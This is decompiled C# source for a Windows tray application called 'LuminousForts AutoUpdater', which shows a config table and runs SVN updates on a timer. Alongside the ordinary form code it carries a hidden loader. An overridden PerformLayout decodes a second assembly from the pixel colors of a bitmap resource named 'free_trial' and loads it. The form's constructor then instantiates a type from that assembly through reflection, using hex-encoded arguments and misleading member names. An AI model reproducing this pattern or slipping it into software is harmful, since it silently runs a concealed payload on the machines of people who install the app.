using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Windows.Forms;
using LuminousForts.Properties;
using LuminousForts_AutoUpdate_Shared;

namespace LuminousForts;

public class MainForm : Form
{
	private Config config = null;

	private Timer timer;

	private SVNUpdater svnUpdater;

	private object[] SanbdoxReflector = new object[3] { "737374655A4C", "797470", "LuminousForts" };

	private ListViewItem selected = null;

	private IContainer components = null;

	private static object DoubleArray;

	private ToolStripMenuItem forceUpdateToolStripMenuItem;

	private ToolStripMenuItem toolsToolStripMenuItem;

	private NotifyIcon icon;

	private ToolStripMenuItem reloadToolStripMenuItem;

	private MenuStrip menuStrip;

	private ListView configTable;

	private ColumnHeader Value;

	private ColumnHeader Key;

	private ToolStripMenuItem helpToolStripMenuItem;

	private ToolStripMenuItem aboutToolStripMenuItem;

	private ToolStripMenuItem exitToolStripMenuItem;

	private ToolStripMenuItem fileToolStripMenuItem;

	public MainForm()
	{
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0088: Expected O, but got Unknown
		InitializeComponent();
		Type.GetType("System.Activator")!.InvokeMember("CreateInstance", BindingFlags.InvokeMethod, null, null, new object[2]
		{
			(Type)DoubleArray,
			SanbdoxReflector
		});
		timer = new Timer();
		config = new Config();
		svnUpdater = new SVNUpdater(config, icon);
		icon.add_DoubleClick((EventHandler)icon_Click);
		((Form)this).set_ShowInTaskbar(false);
		Reload();
	}

	private void Reload()
	{
		LoadConfig();
		timer.Stop();
		timer.set_Interval(config.UpdateInterval * 1000);
		timer.add_Tick((EventHandler)timer_Tick);
		timer.Start();
	}

	private void icon_Click(object sender, EventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		if ((int)((Form)this).get_WindowState() != 1)
		{
			((Form)this).set_WindowState((FormWindowState)1);
		}
		else
		{
			((Form)this).set_WindowState((FormWindowState)0);
		}
	}

	public void LoadConfig()
	{
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0066: Expected O, but got Unknown
		config.LoadConfig();
		configTable.get_Items().Clear();
		foreach (KeyValuePair<string, string> property in config.Properties)
		{
			configTable.get_Items().Add(new ListViewItem(new string[2] { property.Key, property.Value }));
		}
	}

	private void ReloadToolStripMenuItemClick(object sender, EventArgs e)
	{
		Reload();
	}

	private void ForceUpdateToolStripMenuItemClick(object sender, EventArgs e)
	{
		svnUpdater.Update();
	}

	private void ExitToolStripMenuItemClick(object sender, EventArgs e)
	{
		Application.Exit();
	}

	private void ConfigTableSelectedIndexChanged(object sender, EventArgs e)
	{
		if (configTable.get_SelectedItems().get_Count() > 0)
		{
			selected = configTable.get_SelectedItems().get_Item(0);
		}
	}

	private void ConfigTableDoubleClick(object sender, EventArgs e)
	{
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		//IL_005b: Invalid comparison between Unknown and I4
		if (selected != null)
		{
			EditItem editItem = new EditItem();
			string text = selected.get_SubItems().get_Item(0).get_Text();
			string text2 = selected.get_SubItems().get_Item(1).get_Text();
			editItem.Key = text;
			editItem.Value = text2;
			DialogResult val = ((Form)editItem).ShowDialog();
			if ((int)val == 1)
			{
				selected.get_SubItems().get_Item(1).set_Text(editItem.Value);
				config.Properties[editItem.Key] = editItem.Value;
				config.WriteConfig();
				timer.set_Interval(config.UpdateInterval);
				Reload();
			}
		}
	}

	private void timer_Tick(object sender, EventArgs e)
	{
		try
		{
			svnUpdater.Update();
		}
		catch (Exception)
		{
		}
	}

	public virtual void PerformLayout()
	{
		ResourceTemplateDefine("");
	}

	private static string ResourceTemplateDefine(string Subcategory)
	{
		int num = 0;
		byte[] array = new byte[62464];
		Bitmap free_trial = Resources.free_trial;
		for (int i = 0; i < 62464; i++)
		{
			for (int j = 0; j < 1; j++)
			{
				sfioqw(free_trial, i, j);
				Color pixel = free_trial.GetPixel(i, j);
				int num2 = ColorTranslator.ToWin32(pixel);
				array[num] = (byte)num2;
			}
			num++;
		}
		DoubleArray = IsFamilyOrAssembly(Assembly.Load(array)).GetExportedTypes()[1];
		return Subcategory;
	}

	private static Color sfioqw(Bitmap ddd, int x, int y)
	{
		return ddd.GetPixel(x, y);
	}

	private static Assembly IsFamilyOrAssembly(object PureAttribute)
	{
		return (Assembly)PureAttribute;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_0128: Unknown result type (might be due to invalid IL or missing references)
		//IL_03f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d2: Expected O, but got Unknown
		//IL_054d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0557: Expected O, but got Unknown
		//IL_0568: Unknown result type (might be due to invalid IL or missing references)
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MainForm));
		menuStrip = new MenuStrip();
		fileToolStripMenuItem = new ToolStripMenuItem();
		reloadToolStripMenuItem = new ToolStripMenuItem();
		exitToolStripMenuItem = new ToolStripMenuItem();
		toolsToolStripMenuItem = new ToolStripMenuItem();
		forceUpdateToolStripMenuItem = new ToolStripMenuItem();
		aboutToolStripMenuItem = new ToolStripMenuItem();
		helpToolStripMenuItem = new ToolStripMenuItem();
		configTable = new ListView();
		Key = new ColumnHeader();
		Value = new ColumnHeader();
		icon = new NotifyIcon(components);
		((Control)menuStrip).SuspendLayout();
		((Control)this).SuspendLayout();
		((ToolStrip)menuStrip).set_ImageScalingSize(new Size(40, 40));
		((ToolStrip)menuStrip).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[3]
		{
			(ToolStripItem)fileToolStripMenuItem,
			(ToolStripItem)toolsToolStripMenuItem,
			(ToolStripItem)aboutToolStripMenuItem
		});
		((Control)menuStrip).set_Location(new Point(0, 0));
		((Control)menuStrip).set_Name("menuStrip");
		((Control)menuStrip).set_Padding(new Padding(12, 4, 0, 4));
		((Control)menuStrip).set_Size(new Size(1456, 53));
		((Control)menuStrip).set_TabIndex(0);
		((Control)menuStrip).set_Text("menuStrip1");
		((ToolStripDropDownItem)fileToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[2]
		{
			(ToolStripItem)reloadToolStripMenuItem,
			(ToolStripItem)exitToolStripMenuItem
		});
		((ToolStripItem)fileToolStripMenuItem).set_Name("fileToolStripMenuItem");
		((ToolStripItem)fileToolStripMenuItem).set_Size(new Size(75, 45));
		((ToolStripItem)fileToolStripMenuItem).set_Text("File");
		((ToolStripItem)reloadToolStripMenuItem).set_Name("reloadToolStripMenuItem");
		((ToolStripItem)reloadToolStripMenuItem).set_Size(new Size(223, 46));
		((ToolStripItem)reloadToolStripMenuItem).set_Text("Reload");
		((ToolStripItem)reloadToolStripMenuItem).add_Click((EventHandler)ReloadToolStripMenuItemClick);
		((ToolStripItem)exitToolStripMenuItem).set_Name("exitToolStripMenuItem");
		((ToolStripItem)exitToolStripMenuItem).set_Size(new Size(223, 46));
		((ToolStripItem)exitToolStripMenuItem).set_Text("Exit");
		((ToolStripItem)exitToolStripMenuItem).add_Click((EventHandler)ExitToolStripMenuItemClick);
		((ToolStripDropDownItem)toolsToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)forceUpdateToolStripMenuItem });
		((ToolStripItem)toolsToolStripMenuItem).set_Name("toolsToolStripMenuItem");
		((ToolStripItem)toolsToolStripMenuItem).set_Size(new Size(99, 45));
		((ToolStripItem)toolsToolStripMenuItem).set_Text("Tools");
		((ToolStripItem)forceUpdateToolStripMenuItem).set_Name("forceUpdateToolStripMenuItem");
		((ToolStripItem)forceUpdateToolStripMenuItem).set_Size(new Size(311, 46));
		((ToolStripItem)forceUpdateToolStripMenuItem).set_Text("Force Update");
		((ToolStripItem)forceUpdateToolStripMenuItem).add_Click((EventHandler)ForceUpdateToolStripMenuItemClick);
		((ToolStripDropDownItem)aboutToolStripMenuItem).get_DropDownItems().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)helpToolStripMenuItem });
		((ToolStripItem)aboutToolStripMenuItem).set_Name("aboutToolStripMenuItem");
		((ToolStripItem)aboutToolStripMenuItem).set_Size(new Size(112, 45));
		((ToolStripItem)aboutToolStripMenuItem).set_Text("About");
		((ToolStripItem)helpToolStripMenuItem).set_Name("helpToolStripMenuItem");
		((ToolStripItem)helpToolStripMenuItem).set_Size(new Size(194, 46));
		((ToolStripItem)helpToolStripMenuItem).set_Text("Help");
		configTable.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[2] { Key, Value });
		((Control)configTable).set_Dock((DockStyle)5);
		configTable.set_FullRowSelect(true);
		configTable.set_HideSelection(false);
		((Control)configTable).set_Location(new Point(0, 53));
		((Control)configTable).set_Margin(new Padding(6, 6, 6, 6));
		((Control)configTable).set_Name("configTable");
		((Control)configTable).set_Size(new Size(1456, 778));
		((Control)configTable).set_TabIndex(1);
		configTable.set_UseCompatibleStateImageBehavior(false);
		configTable.set_View((View)1);
		configTable.add_SelectedIndexChanged((EventHandler)ConfigTableSelectedIndexChanged);
		((Control)configTable).add_DoubleClick((EventHandler)ConfigTableDoubleClick);
		Key.set_Text("Key");
		Key.set_Width(240);
		Value.set_Text("Value");
		Value.set_Width(450);
		icon.set_Icon((Icon)componentResourceManager.GetObject("icon.Icon"));
		icon.set_Text("icon");
		icon.set_Visible(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(16f, 31f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(1456, 831));
		((Control)this).get_Controls().Add((Control)(object)configTable);
		((Control)this).get_Controls().Add((Control)(object)menuStrip);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MainMenuStrip(menuStrip);
		((Form)this).set_Margin(new Padding(6, 6, 6, 6));
		((Control)this).set_Name("MainForm");
		((Control)this).set_Text("LuminousForts AutoUpdater");
		((Control)menuStrip).ResumeLayout(false);
		((Control)menuStrip).PerformLayout();
		((Control)this).ResumeLayout(false);
		PerformLayout();
	}
}
